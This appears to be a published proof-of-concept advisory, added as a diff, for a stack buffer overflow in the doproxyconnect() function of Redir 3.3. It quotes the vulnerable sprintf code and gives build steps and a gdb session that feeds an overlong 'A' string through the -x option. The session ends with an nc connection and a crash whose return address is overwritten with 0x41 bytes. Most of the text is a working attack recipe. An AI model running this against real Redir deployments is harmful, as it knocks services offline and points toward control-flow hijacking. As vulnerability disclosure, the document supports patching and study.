@@ -1,0 +1,58 @@
+# Exploit Title: Redir 3.3 - Denial of Service (PoC)
+# Date: 2020-01-14
+# Exploit Author: hieubl from HPT Cyber Security
+# Vendor Homepage: https://github.com/troglobit/redir
+# Software Link: https://github.com/troglobit/redir
+# Version: 3.3
+# Tested on: Kali GNU/Linux Rolling 2019.4
+# CVE : [if applicable]
+
+The source code of redir.c contains doproxyconnect() function which
+has the stack overflow vulnerability:
+
+void doproxyconnect(int socket)
+{
+	int x;
+	char buf[128];
+
+	/* write CONNECT string to proxy */
+	sprintf((char *)&buf, "CONNECT %s HTTP/1.0\n\n", connect_str);
+	x = write(socket, (char *)&buf, strlen(buf));
+	if (x < 1) {
+		syslog(LOG_ERR, "Failed writing to proxy: %s", strerror(errno));
+		exit(1);
+	}
+	/* now read result */
+	x = read(socket, (char *)&buf, sizeof(buf));
+	if (x < 1) {
+		syslog(LOG_ERR, "Failed reading reply from proxy: %s", strerror(errno));
+		exit(1);
+	}
+	/* no more error checking for now -- something should be added later */
+	/* HTTP/1.0 200 Connection established */
+}
+
+Download and build:
+# git clone https://github.com/troglobit/redir.git
+# cd redir
+# ./autogen.sh
+# ./configure
+# make
+
+Proof of Concept:
+  In 1st terminal:
+    # gdb -q ./redir
+    # set follow-fork-mode child
+    # r -x AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+:1234 hpt.vn:80
+
+  In 2nd terminal:
+    # nc localhost 1234
+
+  After that, the program in 1st terminal will crash because of buffer
+overflow vulnerability.
+    ...
+    ► 0x5555555571b0 <doproxyconnect+144>    ret    <0x4141414141414141>
+    ...
+    Program received signal SIGSEGV (fault address 0x0)
+    pwndbg>
